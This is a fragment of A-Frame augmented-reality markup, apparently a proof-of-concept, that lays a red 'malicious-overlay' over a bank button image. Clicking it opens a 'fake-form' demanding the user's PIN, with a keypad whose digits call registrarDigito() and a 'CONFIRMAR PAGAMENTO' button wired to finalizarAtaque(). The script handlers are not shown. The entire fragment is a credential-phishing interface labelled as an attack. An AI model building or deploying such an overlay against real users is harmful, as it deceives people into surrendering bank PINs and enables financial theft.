<a-marker type="pattern" url="marker.patt">
        
        <a-image id="btn-orig" src="#btnBanco" position="0 0.1 0" rotation="-90 0 0" width="2.5" height="3.0"></a-image>

        <a-plane id="malicious-overlay" class="clickable" position="0 0.15 0" rotation="-90 0 0" 
                 width="2.6" height="3.1" material="opacity: 0.3; color: red" onclick="abrirPainel()">
        </a-plane>

        <a-entity id="fake-form" position="0 1.2 -1.2" rotation="-90 0 0" visible="false">
          <a-plane width="2.8" height="3.5" color="#111" material="opacity: 0.95"></a-plane>
          
          <a-text value="CONFIRME SEU PIN" align="center" position="0 1.3 0.1" scale="0.6 0.6 0.6" color="white"></a-text>
          
          <a-plane position="0 0.8 0.1" width="2" height="0.4" color="#333">
              <a-text id="pass-display" value="DIGITE..." align="center" position="0 0 0.05" scale="0.8 0.8 0.8" color="#00ff00"></a-text>
          </a-plane>

          <a-plane class="clickable" position="-0.7 0.1 0.2" width="0.6" height="0.6" color="#444" onclick="registrarDigito('1')">
            <a-text value="1" align="center" position="0 0 0.05" scale="1.5 1.5 1.5"></a-text>
          </a-plane>

          <a-plane class="clickable" position="0 0.1 0.2" width="0.6" height="0.6" color="#444" onclick="registrarDigito('2')">
            <a-text value="2" align="center" position="0 0 0.05" scale="1.5 1.5 1.5"></a-text>
          </a-plane>

          <a-plane class="clickable" position="0.7 0.1 0.2" width="0.6" height="0.6" color="#444" onclick="registrarDigito('3')">
            <a-text value="3" align="center" position="0 0 0.05" scale="1.5 1.5 1.5"></a-text>
          </a-plane>

          <a-plane class="clickable" position="0 -0.8 0.2" width="2.2" height="0.6" color="#27ae60" onclick="finalizarAtaque()">
              <a-text value="CONFIRMAR PAGAMENTO" align="center" position="0 0 0.05" scale="0.6 0.6 0.6" color="white"></a-text>
          </a-plane>
        </a-entity>
        
      </a-marker>
